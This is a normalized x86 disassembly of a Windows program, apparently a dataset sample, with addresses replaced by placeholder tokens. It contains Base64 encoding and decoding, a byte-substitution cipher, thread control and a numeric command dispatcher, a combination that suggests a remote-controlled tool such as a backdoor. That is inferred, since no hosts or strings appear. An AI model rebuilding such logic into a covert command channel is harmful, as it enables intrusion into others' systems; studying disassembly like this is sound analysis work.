sub_401065
push 0x4
mov eax sub_43a7bf
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_4237f0
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_403de3
mov eax esi
call sub_425e4c
retn 0x4
sub_401118
push 0x4
mov eax sub_43a7bf
call sub_425dad
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_423871
and [ ebp - 0x4 ] 0x0
add edi 0xc
push edi
lea ecx [ esi + 0xc ]
mov [ esi ] r--data
call sub_403de3
mov eax esi
call sub_425e4c
retn 0x4
sub_401152
push 0x0
mov eax sub_43c7d3
call sub_425dad
mov edi [ ebp + 0x8 ]
mov esi edi
call sub_403dae
and [ ebp - 0x4 ] 0x0
lea esi [ edi + 0x1c ]
call sub_403dae
lea esi [ edi + 0x38 ]
call sub_403dae
lea esi [ edi + 0x54 ]
call sub_403dae
lea esi [ edi + 0x70 ]
call sub_403dae
lea esi [ edi + 0x8c ]
call sub_403dae
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x5
call sub_4145f0
mov eax edi
call sub_425e4c
retn 0x8
sub_4011ad
push ebx
push edi
xor ebx ebx
xor edi edi
push ebx
inc edi
push edi
lea ecx [ esi + 0x8c ]
call sub_40415f
push ebx
push edi
lea ecx [ esi + 0x70 ]
call sub_40415f
push ebx
push edi
lea ecx [ esi + 0x54 ]
call sub_40415f
push ebx
push edi
lea ecx [ esi + 0x38 ]
call sub_40415f
push ebx
push edi
lea ecx [ esi + 0x1c ]
call sub_40415f
push ebx
push edi
mov ecx esi
call sub_40415f
pop edi
pop ebx
retn
sub_401314
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x10
pop ecx
mov esi r--data
lea edi [ ebp - 0x48 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop edi
pop esi
cmp eax 0x3f
ja r-xdata
mov al 0x3d
mov al [ ebp + eax - 0x48 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4234de
leave
retn
sub_401352
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0xc
push ebx
push esi
push edi
mov esi ecx
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
and [ ebp - 0x8 ] 0x0
and [ ebp + 0x8 ] 0x0
lea ecx [ eax - 0x3 ]
mov [ ebp - 0x4 ] esi
test ecx ecx
jle r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
cmp [ ebp + 0x8 ] eax
jge r-xdata
lea eax [ ecx - 0x1 ]
xor edx edx
push 0x3
pop ecx
div ecx
inc eax
mov ecx eax
shl ecx 0x2
mov [ ebp - 0xc ] eax
imul eax eax 0x3
mov [ ebp - 0x8 ] ecx
mov [ ebp + 0x8 ] eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
mov [ edi ] 0x0
pop edi
pop esi
pop ebx
leave
retn
sub eax [ ebp + 0x8 ]
xor esi esi
mov ebx eax
mov [ ebp + 0xc ] esi
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
mov eax esi
shr eax 0x8
and eax 0xf
mov ecx esi
shr ecx 0x16
shl eax 0x2
and ecx 0x3
or eax ecx
push eax
call sub_401314
movsx ebx al
mov eax esi
shr eax 0x10
and eax 0x3f
push eax
call sub_401314
movsx eax al
shl eax 0x8
or ebx eax
mov eax esi
shr eax 0xc
mov ecx esi
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
push eax
shl ebx 0x8
call sub_401314
movsx eax al
shr esi 0x2
or ebx eax
and esi 0x3f
push esi
shl ebx 0x8
call sub_401314
add [ ebp - 0x4 ] 0x3
movsx eax al
or ebx eax
mov [ edi ] ebx
add esp 0x10
add edi 0x4
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp + 0xc ]
mov eax esi
shr eax 0x2
and eax 0x3f
push eax
call sub_401314
mov [ edi ] al
mov eax esi
shr eax 0xc
mov ecx esi
and ecx 0x3
and eax 0xf
shl ecx 0x4
or eax ecx
push eax
call sub_401314
cmp ebx 0x1
pop ecx
pop ecx
mov [ edi + 0x1 ] al
jle r-xdata
push ebx
push [ ebp - 0x4 ]
lea eax [ ebp + 0xc ]
push eax
call sub_4285a0
mov esi [ ebp + 0xc ]
add esp 0xc
mov al 0x3d
mov eax esi
shr eax 0x8
and eax 0xf
mov ecx esi
shr ecx 0x16
shl eax 0x2
and ecx 0x3
or eax ecx
push eax
call sub_401314
pop ecx
jmp r-xdata
mov al 0x3d
shr esi 0x10
and esi 0x3f
push esi
call sub_401314
pop ecx
jmp r-xdata
cmp ebx 0x2
mov [ edi + 0x2 ] al
jle r-xdata
mov [ edi + 0x3 ] al
add edi 0x4
add [ ebp - 0x8 ] 0x4
sub_4014d5
mov dl cl
sub dl 0x41
or eax 0xffffffff
cmp dl 0x19
ja r-xdata
mov dl cl
sub dl 0x61
cmp dl 0x19
ja r-xdata
movsx eax cl
sub eax 0x41
retn
mov dl cl
sub dl 0x30
cmp dl 0x9
ja r-xdata
movsx eax cl
sub eax 0x47
retn
cmp cl 0x2b
jne r-xdata
movsx eax cl
add eax 0x4
retn
cmp cl 0x2f
jne r-xdata
push 0x3e
pop eax
retn
retn
push 0x3f
pop eax
sub_40151d
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov esi eax
mov eax [ ebp + 0xc ]
xor edi edi
cmp eax edi
jne r-xdata
lea ecx [ eax - 0x4 ]
cmp ecx edi
mov [ ebp - 0x4 ] esi
mov esi [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edi
jle r-xdata
mov eax esi
lea edx [ eax + 0x1 ]
cmp [ ebp + 0x8 ] eax
jge r-xdata
lea eax [ ecx - 0x1 ]
shr eax 0x2
inc eax
mov ecx eax
imul ecx ecx 0x3
mov [ ebp - 0x8 ] eax
shl eax 0x2
mov [ ebp - 0x10 ] ecx
mov [ ebp + 0x8 ] eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ ebp + 0xc ] eax
mov eax edi
pop edi
mov [ esi ] 0x0
pop esi
pop ebx
leave
retn
sub eax [ ebp + 0x8 ]
and [ ebp + 0xc ] 0x0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
shr ecx 0x10
call sub_4014d5
mov ebx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
shr ecx 0x8
call sub_4014d5
mov edi eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
shr ecx 0x18
call sub_4014d5
shl eax 0x2
sar eax 0x2
mov ecx ebx
shl ecx 0x6
or eax ecx
and eax 0xff
shl eax 0x4
mov ecx edi
and ecx 0xf
or eax ecx
mov ecx [ ebp - 0x4 ]
mov cl [ ecx ]
and ebx 0x3fc
shl eax 0x4
shl ebx 0x2
sar ebx 0x4
or eax ebx
shl eax 0x6
mov [ ebp - 0xc ] eax
call sub_4014d5
mov ecx [ ebp - 0xc ]
add [ ebp - 0x4 ] 0x4
and edi 0xff0
and eax 0x3f
or ecx eax
shl edi 0x2
shl ecx 0x2
sar edi 0x6
or ecx edi
mov [ esi ] ecx
add esi 0x3
dec [ ebp - 0x8 ]
jne r-xdata
mov edi [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0xc ]
shr ecx 0x8
mov [ ebp + 0x8 ] ecx
call sub_4014d5
mov cl [ ebp + 0xc ]
mov ebx eax
call sub_4014d5
mov ecx ebx
shl ecx 0x2
shl al 0x2
sar ecx 0x6
or al cl
mov [ esi ] al
inc esi
inc edi
cmp [ ebp + 0x8 ] 0x3d
je r-xdata
push eax
push [ ebp - 0x4 ]
lea eax [ ebp + 0xc ]
push eax
call sub_4285a0
add esp 0xc
mov ecx [ ebp + 0xc ]
mov ebx ecx
shr ebx 0x10
cmp bl 0x3d
je r-xdata
mov ecx [ ebp + 0xc ]
shr ecx 0x10
cmp cl 0x3d
je r-xdata
shr ecx 0x18
cmp ecx 0x3d
je r-xdata
call sub_4014d5
shl eax 0x2
sar eax 0x4
shl bl 0x4
or al bl
mov [ esi ] al
inc esi
inc edi
call sub_4014d5
shl eax 0x2
sar eax 0x2
mov cl bl
mov [ ebp + 0xc ] eax
call sub_4014d5
mov ecx [ ebp + 0xc ]
shl al 0x6
or cl al
mov [ esi ] cl
inc esi
inc edi
sub_4016b9
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
push esi
push edi
push 0xf
pop ecx
mov esi r--data
lea edi [ esp + 0x8 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
push 0xf
pop ecx
mov esi r--data
lea edi [ esp + 0x48 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
push rw-data
lea edi [ esp + 0xc ]
call sub_40224e
lea edi [ esp + 0x4c ]
mov [ esp ] rw-data
call sub_40224e
pop ecx
xor edi edi
xor esi esi
mov [ eax + 0x4 ] r--data
mov [ eax + 0x8 ] r--data
mov [ eax + 0xc ] r--data
mov [ eax + 0x10 ] r--data
mov [ eax + 0x14 ] r--data
mov [ eax + 0x18 ] r--data
mov [ eax ] r--data
mov [ eax + 0x4 ] r--data
mov [ eax + 0x8 ] r--data
mov [ eax + 0xc ] r--data
mov [ eax + 0x10 ] r--data
mov [ eax + 0x14 ] r--data
mov [ eax + 0x18 ] r--data
mov [ eax + 0x20 ] edi
mov [ eax + 0x24 ] edi
mov [ eax + 0x28 ] edi
mov esi eax
jmp r-xdata
call sub_403d04
cmp [ rw-data ] 0x3
jne r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov ecx esi
call sub_4017e2
cmp esi edi
je r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
mov [ rw-data ] 0xa4cb80
mov ecx [ esp + 0x8c ]
pop edi
pop esi
xor ecx esp
xor eax eax
call sub_4234de
mov esp ebp
pop ebp
retn
push eax
call [ Sleep@IAT ]
jmp r-xdata
push 0x65c8
call sub_4246c6
pop ecx
cmp eax edi
je r-xdata
sub_4017e2
push 0x12c
mov eax sub_43dfdb
call sub_425e16
mov ebx ecx
xor edi edi
push rw-data
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xc4 ] edi
call sub_403dc1
lea eax [ ebp - 0x138 ]
push eax
lea eax [ ebp - 0xbc ]
push eax
mov [ ebp - 0x4 ] edi
call sub_401152
xor esi esi
push edi
inc esi
push esi
lea ecx [ ebp - 0x138 ]
mov [ ebp - 0x4 ] 0x2
call sub_40415f
push 0x494
call sub_4246c6
pop ecx
mov [ ebp - 0xc0 ] eax
mov [ ebp - 0x4 ] 0x3
cmp eax edi
je r-xdata
xor eax eax
push rw-data
lea ecx [ ebp - 0xe4 ]
call sub_403dc1
lea eax [ ebp - 0xe4 ]
push eax
lea eax [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x4
push eax
push [ ebp - 0xc0 ]
mov [ ebp - 0xc4 ] esi
call sub_406630
jmp r-xdata
mov edi [ ebx + 0x1c ]
lea eax [ ebx + 0x4 ]
push eax
call sub_40db8d
mov eax [ ebx + 0x1c ]
mov [ eax + 0x370 ] ebx
mov [ eax + 0x37c ] ebx
mov [ eax + 0x374 ] ebx
mov [ eax + 0x378 ] ebx
mov edi [ ebx + 0x1c ]
lea eax [ ebx + 0x18 ]
push eax
call sub_40d87c
push r--data
lea ecx [ ebp - 0x100 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x6
call sub_403dc1
lea eax [ ebp - 0x100 ]
push eax
mov [ ebp - 0x4 ] 0x7
mov ecx [ ebx + 0x1c ]
lea eax [ ebp - 0xe4 ]
push eax
mov eax [ ecx ]
call [ eax + 0x10 ]
mov esi eax
call sub_412aae
xor edi edi
push 0x0
inc edi
push edi
lea ecx [ ebp - 0xe4 ]
call sub_40415f
push 0x0
push edi
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x2
call sub_40415f
push r--data
lea ecx [ ebp - 0xe4 ]
call sub_403dc1
push r--data
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x8
call sub_403dc1
lea eax [ ebp - 0xe4 ]
push eax
mov [ ebp - 0x4 ] 0x9
mov ecx [ ebx + 0x1c ]
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ecx ]
call [ eax + 0x10 ]
mov esi eax
call sub_412aeb
push 0x0
push edi
lea ecx [ ebp - 0x100 ]
call sub_40415f
push 0x0
push edi
lea ecx [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x2
call sub_40415f
mov ecx [ ebx + 0x1c ]
mov eax [ ecx ]
call [ eax + 0x10 ]
push rw-data
sub eax 0xffffff80
call sub_403f8c
lea eax [ ebp - 0x11c ]
push eax
call sub_403eef
push r--data
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0xa
call sub_403dc1
mov [ ebp - 0x4 ] 0xb
mov eax [ ebp - 0x108 ]
mov ecx [ ebp - 0x11c ]
push eax
push ecx
lea eax [ ebp - 0x100 ]
push eax
lea edi [ ebp - 0x11c ]
call sub_4041aa
xor esi esi
push esi
push 0x1
lea ecx [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0xa
call sub_40415f
mov ecx [ ebx + 0x1c ]
add ecx 0x34c
mov eax edi
call sub_403f4b
lea eax [ ebx + 0x8 ]
mov ebx [ ebx + 0x1c ]
mov [ ebp - 0xc0 ] eax
lea eax [ ebp - 0xc0 ]
add ebx 0x384
push eax
add ebx 0x4
mov edi 0xfffff
call sub_414a75
mov [ eax ] esi
mov esi [ ebp - 0xc8 ]
mov [ eax + 0x4 ] edi
push [ esi + 0x1c ]
xor edi edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call sub_40b1ea
test al al
je r-xdata
push edi
push esi
lea ecx [ ebp - 0xe4 ]
call sub_40415f
mov [ ebp - 0x4 ] 0x2
test [ ebp - 0xc4 ] 0x1
mov [ ebx + 0x1c ] eax
je r-xdata
mov ecx [ esi + 0x1c ]
cmp ecx edi
je r-xdata
mov eax [ esi + 0x1c ]
add eax 0x160
mov ecx [ eax ]
cmp ecx edi
je r-xdata
lea eax [ ebp - 0x11c ]
call sub_403f2c
lea esi [ ebp - 0xbc ]
call sub_4011ad
call sub_425e60
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
push 0x12
pop ebx
cmp [ ecx + 0x8 ] edi
je r-xdata
cmp ebx edi
je r-xdata
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
push 0x11
call [ eax + 0x18 ]
mov [ rw-data ] edi
mov eax ecx
mov edx [ eax ]
push 0x2dc6c0
call [ edx + 0x8 ]
mov ebx eax
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
sub_401b1c
push ebp
lea ebp [ esp - 0x10004 ]
mov eax 0x10004
call sub_436f80
push 0xffffffff
push sub_43ec02
mov eax [ fs : 0x0 ]
push eax
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x10000 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x1000c ]
mov esi 0x7fff
xor ebx ebx
push esi
lea eax [ ebp + 0x1 ]
push ebx
push eax
mov [ ebp - 0x10 ] ecx
mov [ ebp ] bl
call sub_42b5a0
push esi
lea eax [ ebp + 0x8001 ]
push ebx
push eax
mov [ ebp + 0x8000 ] bl
call sub_42b5a0
add esp 0x18
push r--data
lea ecx [ ebp - 0x48 ]
call sub_403dc1
lea ecx [ ebp - 0x48 ]
push ecx
lea ecx [ ebp - 0x64 ]
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x88 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
mov [ edx ] cl
inc edx
cmp cl bl
jne r-xdata
xor esi esi
push ebx
inc esi
push esi
lea ecx [ ebp - 0x64 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push esi
lea ecx [ ebp - 0x48 ]
call sub_40415f
push r--data
lea ecx [ ebp - 0x2c ]
call sub_403dc1
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ ebp - 0x80 ]
mov [ ebp - 0x4 ] esi
mov eax [ edi ]
push ecx
mov ecx edi
call [ eax + 0x88 ]
push ebx
push esi
lea ecx [ ebp - 0x80 ]
call sub_40415f
or [ ebp - 0x4 ] 0xffffffff
push ebx
push esi
lea ecx [ ebp - 0x2c ]
call sub_40415f
lea eax [ ebp ]
push eax
lea edi [ ebp + 0x8000 ]
call sub_40224e
mov eax [ ebp ]
cmp eax 0x14
pop ecx
jg r-xdata
lea edx [ ebp + 0x8000 ]
sub eax 0x16
je r-xdata
je r-xdata
mov eax [ ebp - 0x10 ]
push [ eax + 0x10 ]
lea ecx [ ebp ]
call sub_4039bc
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
push [ eax + 0x10 ]
lea ecx [ ebp ]
call sub_40362c
jmp r-xdata
sub eax 0xd
je r-xdata
lea eax [ ebp ]
call sub_40397a
jmp r-xdata
dec eax
je r-xdata
pop ecx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
call sub_402cc9
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x10000 ]
xor ecx ebp
call sub_4234de
add ebp 0x10004
leave
retn 0x8
mov esi [ ebp - 0x10 ]
push [ esi + 0x10 ]
lea ecx [ ebp ]
call sub_4030e8
pop ecx
dec eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov edi [ eax + 0x10 ]
call sub_402e5f
jmp r-xdata
dec eax
je r-xdata
mov esi [ ebp - 0x10 ]
mov ebx [ esi + 0x10 ]
call sub_403212
jmp r-xdata
dec eax
jne r-xdata
mov eax [ ebp - 0x10 ]
push [ eax + 0x10 ]
lea ecx [ ebp ]
call sub_402f91
jmp r-xdata
dec eax
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ ecx ]
push 0x11
call [ eax + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
push [ eax + 0x10 ]
call sub_403c18
jmp r-xdata
mov eax [ ebp - 0x10 ]
push [ eax + 0x10 ]
call sub_4032b9
jmp r-xdata
dec eax
dec eax
jne r-xdata
mov eax [ ebp - 0x10 ]
push [ eax + 0x10 ]
lea ecx [ ebp ]
call sub_4034db
jmp r-xdata
sub_401d3b
push 0x0
mov eax sub_43b641
call sub_425dad
mov edi ecx
push [ edi + 0x20 ]
mov eax [ edi + 0x1c ]
call sub_40da5d
mov eax [ ebp + 0x8 ]
lea ecx [ edi + 0x10 ]
mov [ edi + 0x20 ] eax
push 0x38
mov [ eax + 0xb0 ] ecx
call sub_4246c6
mov ebx eax
pop ecx
mov [ ebp + 0x8 ] ebx
and [ ebp - 0x4 ] 0x0
test ebx ebx
je r-xdata
xor ebx ebx
push [ edi + 0x20 ]
mov esi ebx
call sub_4166e5
and [ ebx + 0x8 ] 0x0
lea esi [ ebx + 0xc ]
mov [ ebx ] r--data
call sub_403dae
and [ ebx + 0x28 ] 0x0
and [ ebx + 0x30 ] 0x0
mov [ ebx + 0x2c ] 0xf
mov [ ebx + 0x34 ] 0x0
jmp r-xdata
xor esi esi
push [ edi + 0x20 ]
call sub_4166e5
and [ esi + 0x8 ] 0x0
mov [ esi ] r--data
mov [ esi + 0xc ] 0x10
mov [ esi + 0x10 ] 0x1
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ edi + 0xc ]
mov [ edi + 0x24 ] ebx
push 0x14
mov [ ebx + 0x8 ] eax
call sub_4246c6
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] 0x1
test esi esi
je r-xdata
lea eax [ edi + 0x14 ]
mov [ edi + 0x28 ] esi
mov [ esi + 0x8 ] eax
call sub_425e4c
retn 0x4
sub_401e02
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx ]
push esi
mov esi ecx
mov ecx ebx
call [ eax + 0x6c ]
add eax 0x70
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test al al
je r-xdata
mov edx eax
mov ecx rw-data
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebx ]
push edi
mov ecx ebx
call [ eax + 0x7c ]
cmp eax 0x1
jne r-xdata
xor eax eax
jmp r-xdata
mov al [ ecx + 0x1 ]
cmp al [ edx + 0x1 ]
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x7c ]
cmp eax 0x6
jne r-xdata
xor edi edi
cmp edi [ esi + 0x1c ]
jge r-xdata
test eax eax
je r-xdata
inc ecx
inc ecx
inc edx
inc edx
test al al
jne r-xdata
pop edi
xor edi edi
cmp [ esi + 0x1c ] edi
jle r-xdata
jne r-xdata
lea eax [ esi + 0x20 ]
mov [ ebp + 0x8 ] eax
mov al [ ecx ]
cmp al [ edx ]
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
jne r-xdata
lea ebx [ esi + 0x20 ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
add eax 0x70
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
cmp [ rw-data ] eax
je r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov ecx eax
mov eax [ ebp + 0x8 ]
push [ rw-data ]
call [ SetEvent@IAT ]
xor eax eax
push eax
push eax
push [ esi + 0x4 ]
push sub_4027a7
push eax
push eax
call sub_423b4f
add esp 0x18
mov [ rw-data ] eax
jmp r-xdata
push [ rw-data ]
call [ SetEvent@IAT ]
push 0x7d0
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov ecx eax
mov eax ebx
mov dl [ eax ]
inc eax
mov [ edi ] dl
inc edi
test dl dl
jne r-xdata
mov [ ecx + 0x120 ] 0x1
inc [ esi + 0x18 ]
inc [ esi + 0x1c ]
jmp r-xdata
imul edi edi 0x104
lea ecx [ edi + esi ]
lea edi [ ecx + 0x20 ]
mov eax edi
imul eax eax 0x104
lea eax [ eax + esi + 0x120 ]
cmp [ eax ] 0x0
jne r-xdata
add [ ebp + 0x8 ] 0x104
inc edi
cmp edi [ esi + 0x1c ]
jl r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
push 0x0
push [ rw-data ]
call [ TerminateThread@IAT ]
and [ rw-data ] 0x0
imul edi edi 0x104
and [ edi + esi + 0x120 ] 0x0
dec [ esi + 0x18 ]
inc edi
add ebx 0x104
cmp edi [ esi + 0x1c ]
jl r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
cmp edi [ esi + 0x1c ]
mov [ eax ] 0x1
inc [ esi + 0x18 ]
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x6c ]
add eax 0x70
cmp [ eax + 0x18 ] 0x10
jb r-xdata
jmp r-xdata
test eax eax
je r-xdata
inc eax
inc eax
inc ecx
inc ecx
test dl dl
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x6c ]
add eax 0x70
cmp [ eax + 0x18 ] 0x10
jb r-xdata
jmp r-xdata
test eax eax
je r-xdata
inc eax
inc eax
inc ecx
inc ecx
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_40202a
push edi
mov edi eax
cmp [ edi + 0x14 ] 0x0
je r-xdata
push [ esp + 0x8 ]
push edi
call sub_403fa5
push r--data
push edi
call sub_403fa5
push [ esp + 0xc ]
push edi
call sub_403fa5
pop edi
retn
push ebx
xor ebx ebx
push 0x26
inc ebx
call sub_403fc6
pop ebx
sub_402060
push 0x60
mov eax sub_43aa95
call sub_425e16
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x6c ] ecx
push eax
lea ecx [ ebp - 0x64 ]
mov esi edx
call sub_403dc1
xor edi edi
push esi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] edi
call sub_403dc1
xor ebx ebx
inc ebx
push r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] bl
call sub_403dc1
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_403fa5
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
push edi
push eax
lea eax [ ebp - 0x64 ]
push eax
call sub_403eca
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x18 ]
lea esi [ ecx + eax ]
jmp r-xdata
xor esi esi
cmp esi [ ebp - 0x50 ]
jb r-xdata
mov edi esi
lea eax [ ebp - 0x64 ]
call sub_403eaa
cmp [ eax ] 0x26
je r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
lea eax [ ebp - 0x64 ]
call sub_403eaa
mov al [ eax ]
mov [ ebp - 0x68 ] al
push [ ebp - 0x68 ]
lea edi [ ebp - 0x48 ]
call sub_403fc6
inc esi
mov esi [ ebp - 0x34 ]
mov edi [ ebp - 0x6c ]
push esi
push eax
push edi
call sub_4285a0
mov [ esi + edi ] 0x0
add esp 0xc
mov esi ebx
xor edi edi
jmp r-xdata
lea eax [ ebp - 0x44 ]
push edi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_40415f
push edi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_40415f
push edi
push ebx
lea ecx [ ebp - 0x64 ]
call sub_40415f
mov eax esi
call sub_425e60
retn
sub_402153
push ebp
mov ebp esp
mov eax 0x8004
call sub_436f80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x7fff
lea eax [ ebp - 0x8003 ]
push 0x0
push eax
mov [ ebp - 0x8004 ] 0x0
call sub_42b5a0
xor ecx ecx
add esp 0xc
cmp [ ebp + 0xc ] ecx
jbe r-xdata
push [ ebp + 0xc ]
lea ecx [ ebp - 0x8004 ]
push edi
call sub_401352
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4234de
leave
retn
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x8004 ]
sub esi eax
lea eax [ ebp + ecx - 0x8004 ]
movzx edx [ esi + eax ]
mov dl [ edx + rw-data ]
inc ecx
mov [ eax ] dl
cmp ecx [ ebp + 0xc ]
jb r-xdata
pop esi
sub_4021d1
push ebp
mov ebp esp
mov eax 0x8004
call sub_436f80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
push 0x7fff
lea eax [ ebp - 0x8003 ]
push 0x0
push eax
mov esi ecx
mov edi edx
mov [ ebp - 0x8004 ] 0x0
call sub_42b5a0
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8004 ]
push eax
mov eax edi
call sub_40151d
mov edi eax
add esp 0x14
test edi edi
jle r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_4234de
leave
retn
lea ecx [ ebp - 0x8004 ]
mov edx esi
sub ecx esi
mov esi edi
movzx eax [ ecx + edx ]
mov al [ eax + rw-data ]
mov [ edx ] al
inc edx
dec esi
jne r-xdata
sub_40224e
push ebp
lea ebp [ esp - 0x1033c ]
mov eax 0x103bc
call sub_436f80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x10338 ] eax
mov eax [ ebp + 0x10344 ]
push ebx
push esi
xor ebx ebx
push 0x7fff
mov [ ebp - 0x80 ] eax
lea eax [ ebp + 0x8339 ]
push ebx
push eax
mov [ ebp + 0x8338 ] bl
call sub_42b5a0
mov eax edi
add esp 0xc
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
push eax
mov edx edi
lea ecx [ ebp + 0x8338 ]
call sub_4021d1
mov [ ebp + 0x8320 ] eax
lea eax [ ebp - 0x78 ]
mov [ ebp + 0x831c ] eax
lea eax [ ebp - 0x7c ]
mov [ ebp + 0x8328 ] eax
xor eax eax
pop ecx
xor esi esi
lea ecx [ ebp + 0x8338 ]
mov [ ebp + 0x8302 ] ax
mov [ ebp + 0x8306 ] ax
inc esi
lea eax [ ebp - 0x74 ]
mov [ ebp + 0x8318 ] ecx
mov [ ebp + 0x832c ] ebx
mov [ ebp + 0x8330 ] ebx
mov [ ebp - 0x78 ] ebx
mov [ ebp - 0x7c ] ebx
